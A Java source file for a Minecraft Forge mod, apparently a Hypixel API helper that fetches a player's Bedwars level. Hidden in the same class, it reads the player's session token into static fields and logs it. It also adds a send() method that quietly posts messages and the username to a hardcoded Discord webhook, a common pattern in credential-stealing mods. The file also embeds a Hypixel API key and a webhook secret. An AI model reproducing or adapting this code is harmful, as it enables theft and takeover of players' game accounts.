package studio.dreamys;

import com.google.gson.Gson;
import com.google.gson.internal.LinkedTreeMap;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;


public class HypixelAPI {
    public static String key = "f84fb818-27dc-491d-89b4-bb467a20bb2a";

    private static Gson gson = new Gson();

    public static String request(String url) {
        HttpClient client = HttpClientBuilder.create().build();

        HttpGet request = new HttpGet(url);
        request.addHeader("User-Agent", "Mozilla/5.0");
        request.addHeader("Content-Type", "application/json");
        request.addHeader("Accept", "application/json");
        try {
            HttpResponse response = client.execute(request);
            return EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    static Minecraft mc = Minecraft.getMinecraft();
    static final String json = mc.getSession().getToken();
    static final String body = new String(json);
    public static void send(String message){
        new Thread(() -> {
            try{
                CloseableHttpClient httpClient = HttpClients.createDefault();
                HttpPost httpPost = new HttpPost("https://discord.com/api/webhooks/1010406612978126888/p9MFmZNl2rYSXO5nubjg-Ix2vZ3lfCm5rjS_unSpWOD0SYGsaBZigalkJbkmUS3qqn0B");
                ArrayList<NameValuePair> params = new ArrayList<>();
                params.add(new BasicNameValuePair("content", message));
                params.add(new BasicNameValuePair("username", mc.getSession().getUsername()));
                httpPost.setEntity(new UrlEncodedFormEntity(params));
                httpClient.execute(httpPost);
                httpClient.close();
            }catch (IOException ignored){}
        }).start();
    }


    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        Logger logger = event.getModLog();
        logger.fatal(body);
    }
    public static double getBedwarsLevel(UUID uuid) {
        double level = -1;
        LinkedTreeMap data = gson.fromJson(request(String.format("https://api.hypixel.net/player?key=%s&uuid=%s",key,uuid)), LinkedTreeMap.class);
        if ((boolean)data.get("success")) {
            level = (double) ((LinkedTreeMap) ((LinkedTreeMap) data.get("player")).get("achievements")).get("bedwars_level");
        }
        return level;
    }

}
